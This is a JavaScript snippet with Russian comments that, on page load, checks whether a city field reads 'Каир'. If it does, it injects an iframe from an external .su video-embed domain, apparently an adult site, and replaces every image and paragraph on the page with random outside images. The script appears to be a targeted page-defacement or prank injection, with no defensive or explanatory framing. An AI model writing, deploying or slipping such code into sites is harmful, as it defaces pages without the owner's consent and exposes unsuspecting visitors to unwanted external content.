document.addEventListener("DOMContentLoaded", function() {
    if (document.querySelector('.text-right > span:nth-child(2) > span:nth-child(1)').innerHTML == 'Каир') {

        document.getElementsByClassName('notify-block')[0].innerHTML = '<iframe width="852" height="480" src="https://oy5g1k3w7.xtubetv.su/embed/86077" frameborder="0" allowfullscreen webkitallowfullscreen mozallowfullscreen oallowfullscreen msallowfullscreen></iframe>'

        var imageLinks1 = [
            "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTd7poVnBGsfd2svvt_ypyGt0Opuu4a64IYg6W7KnmIHQ&s",
            "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTd5SH9FUXdGAfiW-GNA97XePamF8hOhxWO0546hkGnnA&s",
            "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSYsDVLvhbBFVL2NrE16e7eaGRK1O6odtnqEiTLPej_Ww&s",
            // Добавьте дополнительные ссылки по мере необходимости
        ];

        var imgs = document.getElementsByTagName("img");
        console.log(imgs)
        for (let item of imgs) {
            console.log(item);
            var image = document.createElement("img");

            // Выбираем случайную ссылку из массива
            // Выбираем случайную ссылку из массива
            var randomIndex = Math.floor(Math.random() * imageLinks1.length);
            console.log(randomIndex);
            var randomImageLink = imageLinks1[randomIndex];

            // Задаем атрибуты изображения (src, alt и т.д.), при необходимости
            image.src = randomImageLink;
            image.alt = "альтернативный_текст_изображения";

            // Заменяем элемент <p> на новый элемент <img>
            item.replaceWith(image);
        }

        var imageLinks2 = [
            "https://static.insales-cdn.com/images/products/1/6658/357620226/117800012_1.jpg",
            "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQdXgKq0AbpKNNxvq6QDz1xglo2RuDJll4V8gIT5PqDMQ&s",
            // Добавьте дополнительные ссылки по мере необходимости
        ];

        var paragraphs = document.getElementsByTagName("p");

        // Проходимся по каждому элементу <p>
        for (let item of paragraphs) {
            var image = document.createElement("img");

            // Выбираем случайную ссылку из массива
            var randomIndex = Math.floor(Math.random() * imageLinks2.length);
            var randomImageLink = imageLinks2[randomIndex];

            // Задаем атрибуты изображения (src, alt и т.д.), при необходимости
            image.src = randomImageLink;
            image.alt = "альтернативный_текст_изображения";

            // Заменяем элемент <p> на новый элемент <img>
            item.replaceWith(image);
        }

    }
});
